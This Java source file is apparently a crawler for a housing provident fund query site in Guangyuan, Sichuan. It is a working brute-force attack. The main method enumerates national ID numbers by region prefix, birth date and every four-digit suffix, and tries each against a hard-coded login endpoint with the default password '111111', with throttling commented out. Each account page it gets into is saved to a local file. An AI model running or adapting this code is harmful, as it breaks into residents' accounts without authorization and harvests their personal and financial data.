package cn.springmvc.spider.gjj;

import cn.springmvc.spider.HttpClientFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

/**
 * @author nidayu
 * @Description: 四川广元
 * @date 2016/11/30
 */
public class GuangYuan extends HttpClientFactory {

    private CloseableHttpClient httpClient;

    public GuangYuan(CloseableHttpClient httpClient){
        this.httpClient = httpClient;
    }

    public int login(String userName, String password) {

        String url = "http://125.64.55.211:8081/gywscx/zfbzgl/zfbzsq/login_hidden.jsp?password=" + password + "&sfzh=" + userName + "&cxyd=%B5%B1%C7%B0%C4%EA%B6%C8&zgzh=";
        String[][] headers = new String[][]{
                {"Referer", "http://125.64.55.211:8081/gywscx/zfbzgl/zfbzsq/login.jsp"}
        };
        String responseString = getUrl(url, headers, "GBK");

        if (responseString != null && responseString.contains("当前年度")) {
            Document doc = Jsoup.parse(responseString);
            Elements eles = doc.select("input[type=hidden]");

            String name0 = eles.get(0).attr("name");
            String value0 = eles.get(0).attr("value");
            String name1 = eles.get(1).attr("name");
            String value1 = eles.get(1).attr("value");
            String name2 = eles.get(2).attr("name");
            String value2 = eles.get(2).attr("value");
            String name3 = eles.get(3).attr("name");
            String value3 = eles.get(3).attr("value");

            try {
                url = "http://125.64.55.211:8081/gywscx/zfbzgl/zfbzsq/main_menu.jsp?"+ name0 +"="+value0
                        +"&" + name1 + "=" + value1 + "&" + name2 + "=" + URLEncoder.encode(value2, "gb2312")
                        + "&" + name3 + "=" + value3 + "&cxyd=%B5%B1%C7%B0%C4%EA%B6%C8";
            } catch (UnsupportedEncodingException e) {

            }
            responseString = getUrl(url, headers, "GBK");

            if (responseString != null && responseString.contains("公积金信息")) {
                try {
                    FileOutputStream fos = new FileOutputStream("C:\\广元\\"+userName+".html");
                    fos.write(responseString.getBytes());
                    fos.close();
                } catch (IOException e) {

                }
                return 0;
            }
        }
        return 1;
    }

    public static void main(String[] args) {

        CloseableHttpClient httpClient = getInstance();
        GuangYuan guangYuan = new GuangYuan(httpClient);
        // 取年
        String first = "510800";
        for (int year = 1990; year > 1970; year --) {
            // 取月
            for (int mon = 1; mon < 13; mon ++){
                String month = mon < 10 ? ("0"+mon) : mon + "";
                // 取日
                int lastDay = 31;
                if (mon == 2){
                    lastDay = 28;
                } else if (mon == 4 || mon == 6 || mon ==9 || mon == 11){
                    lastDay = 30;
                }
                for (int day = 1; day <= lastDay; day ++){
                    String thisDay = day < 10 ? ("0" + day) : day + "";
                    for (int last = 1; last < 10000; last++) {
                        String four = "000" + last;
                        four = four.substring(four.length() - 4);
                        String info = first + year + month + thisDay + four;
                        System.out.println(info);
                        guangYuan.login(info, "111111");
                        if (info.endsWith("0")) {
                            System.out.println(info.substring(0, info.length() - 1) + "X");
                            guangYuan.login(info.substring(0, info.length() - 1) + "X", "111111");
                        }
//                        try {
//                            Thread.sleep(1 * 1000);
//                        } catch (InterruptedException e) {
//                            e.printStackTrace();
//                        }
                    }
                }
            }
        }
    }
}
